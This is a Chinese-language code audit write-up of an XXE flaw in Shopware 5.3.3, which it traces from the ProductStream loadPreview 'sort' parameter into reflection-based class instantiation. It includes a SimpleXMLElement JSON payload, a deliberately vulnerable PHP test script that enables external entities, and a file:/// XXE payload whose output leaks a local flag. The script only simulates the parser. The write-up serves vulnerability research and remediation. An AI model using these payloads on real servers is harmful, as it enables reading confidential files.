# shopware-5.3.3-代码审计
## SimpleXMLElement 类导致的 XXE漏洞

在一个正常的商业业务逻辑, 预览产品流的的详细信息是一个正常的行为

在 Shopware 5.3.3 版本中的 loadPreviewAction 方法(位于 engine\Shopware\Controllers\Backend\ProductStream.php )就是提供该功能

```php
class Shopware_Controllers_Backend_ProductStream extends Shopware_Controllers_Backend_Application
{
    protected $model = 'Shopware\Models\ProductStream\ProductStream';
    protected $alias = 'stream';

	......

    public function loadPreviewAction()
    {
        $conditions = $this->Request()->getParam('conditions');
        $conditions = json_decode($conditions, true);

        $sorting = $this->Request()->getParam('sort');

        $criteria = new Criteria();

        /** @var RepositoryInterface $streamRepo */
        $streamRepo = $this->get('shopware_product_stream.repository');
        $sorting = $streamRepo->unserialize($sorting);

        foreach ($sorting as $sort) {
            $criteria->addSorting($sort);
        }

        $conditions = $streamRepo->unserialize($conditions);

        foreach ($conditions as $condition) {
            $criteria->addCondition($condition);
        }
	......
```
该方法会接收一个用户传来的sort参数, 传入到了 unserialize() 中, 能够在 Repository 类中, 查看到 unserialize 方法的实现(寻找Repository类的原因在于 unserialize 需要 serialize 作为前置条件), 该方法能够在 engine\Shopware\Components\ProductStream\Repository.php 文件中找到

```php
......
use Shopware\Components\LogawareReflectionHelper;

class Repository implements RepositoryInterface
{
	....
    /**
     * @param array $serializedConditions
     *
     * @return object[]
     */
    public function unserialize($serializedConditions)
    {
        return $this->reflector->unserialize($serializedConditions, 'Serialization error in Product stream');
    }
    ....
```

我们能够从文件头部的引用与方法声明中获知, Repository 类的 unserialize 方法, 调用的是 LogawareReflectionHelper 类的 unserialize 方法(位于 engine\Shopware\Components\LogawareReflectionHelper.php )

```php
class LogawareReflectionHelper
{
......
    /**
     * @param array  $serialized
     * @param string $errorSource
     *
     * @return array
     */
    public function unserialize($serialized, $errorSource)
    {
        $classes = [];

        foreach ($serialized as $className => $arguments) {
            $className = explode('|', $className);
            $className = $className[0];

            try {
                $classes[] = $this->reflector->createInstanceFromNamedArguments($className, $arguments);
            } catch (\Exception $e) {
                $this->logger->critical($errorSource . ': ' . $e->getMessage());
            }
        }

        return $classes;
    }
}
```

`$serialized` 就是传入的sort, 程序分别从 sort 中提取出值并赋值给 `$className` 和 `$arguments` 变量, 之后两个变量给传入了 createInstanceFromNamedArguments 方法(位于 engine\Shopware\Components\ReflectionHelper.php 的 ReflectionHelper类中)

```php
class ReflectionHelper
{
    /**
     * @param string $className
     * @param array  $arguments
     *
     * @return object
     */
    public function createInstanceFromNamedArguments($className, $arguments)
    {
        $reflectionClass = new \ReflectionClass($className);

        if (!$reflectionClass->getConstructor()) {
            return $reflectionClass->newInstance();
        }

        $constructorParams = $reflectionClass->getConstructor()->getParameters();

        $newParams = [];
        foreach ($constructorParams as $constructorParam) {
            $paramName = $constructorParam->getName();

            if (!isset($arguments[$paramName])) {
                if (!$constructorParam->isOptional()) {
                    throw new \RuntimeException(sprintf("Required constructor Parameter Missing: '$%s'.", $paramName));
                }
                $newParams[] = $constructorParam->getDefaultValue();

                continue;
            }

            $newParams[] = $arguments[$paramName];
        }

        return $reflectionClass->newInstanceArgs($newParams);
    }
}
```

我们能够注意到这里创建了一个反射类, 类的名称来自于 `$sort` 变量, 能够被用户利用

之后的  `$newParams[]` 作为参数创建了一个新的实例对象, 值来自于 `$arguments[$paramName]` , $arguments 同样是用户能够控制的(来自于 `$sort` 变量)

我们能够通过这里实例化一个 SimpleXMLElement 类对象, 进行XXE漏洞利用



登陆后台, 利用路径为 Items --> Product streams --> Add condition stream --> sorting 设置为 Lowest price --> Refresh preview

```
GET /backend/ProductStream/loadPreview?_dc=1774841992758&sort=%7B%22Shopware%5C%5CBundle%5C%5CSearchBundle%5C%5CSorting%5C%5CPriceSorting%22%3A%7B%22direction%22%3A%22ASC%22%7D%7D&conditions=%7B%7D&shopId=1&currencyId=1&customerGroupKey=EK&page=1&start=0&limit=25 HTTP/1.1
Host: shopware.audit
X-CSRF-Token: 4N5WgdP8TheXwNrjafIt6qO3cBXfFa
X-Requested-With: XMLHttpRequest
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: */*
Referer: http://shopware.audit/backend/
Accept-Encoding: gzip, deflate, br
Cookie: SHOPWAREBACKEND=535a794581e1548e08b5378bf82cef8c; lastCheckSubscriptionDate=30032026
Connection: keep-alive
```

其中的 sort 值解码为(URL编码)

```
{"Shopware\\Bundle\\SearchBundle\\Sorting\\PriceSorting":{"direction":"ASC"}}
```

这意味着我们能够按照类似的格式进行Payload构造

```
{"SimpleXMLElement":{"data":"http://localhost/xxe.xml","options":2,"data_is_url":1,"ns":"","is_prefix":0}}
```

## 验证XXE漏洞

> Windows平台验证, 该漏洞需要主义libxml在2.9.0+后禁用了外部实体, 需要手动切换

使用脚本验证

将脚本放置在 Web 目录("D:\Applications\phpstudy_pro\WWW\shopware.audit\xxe_test.php")

```
<?php
// 模拟 Shopware 5.3.3 之前的脆弱环境配置
// 注意：在 libxml 2.9.0+ 中，默认是禁用的，为了复现需要手动开启
if (function_exists('libxml_disable_entity_loader')) {
    libxml_disable_entity_loader(false); 
}

// 模拟从 HTTP Post 获取的恶意 XML 数据
$xml_data = file_get_contents('php://input');

if (empty($xml_data)) {
    die("请通过 POST 发送 XML Payload。");
}

try {
    // LIBXML_NOENT 是触发关键：它允许替代实体
    // Shopware 的旧版本解析器中常带有此参数或未显式禁止
    $dom = new DOMDocument();
    $dom->loadXML($xml_data, LIBXML_NOENT | LIBXML_DTDLOAD);
    
    // 将解析后的结果转为对象，观察实体是否被替换
    $simpleXml = simplexml_import_dom($dom);
    
    echo "--- 解析结果 ---\n";
    print_r($simpleXml);
    echo "\n---------------";
    
} catch (Exception $e) {
    echo "解析出错: " . $e->getMessage();
}
```

设置Payload, 使用的是phpstorm中的HTTP Client进行测试

建立一个 test_payload.http文件

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///D:/Applications/phpstudy_pro/WWW/flag.txt">
]>
<root>
  <name>test</name>
  <content>&xxe;</content>
</root>
```

读取的是 D:\Applications\phpstudy_pro\WWW 下的flag.txt

返回结果

```
--- 解析结果 ---
SimpleXMLElement Object
(
[name] => test
[content] => flag{X33_W1tH_S1mpl3Xml3l3m3nt}

)

---------------
```

完成了flag.txt文件内容的读取

## 修复建议

- 过滤关键词，如： **ENTITY** 、 **SYSTEM** 等
- 禁止加载XML实体对象



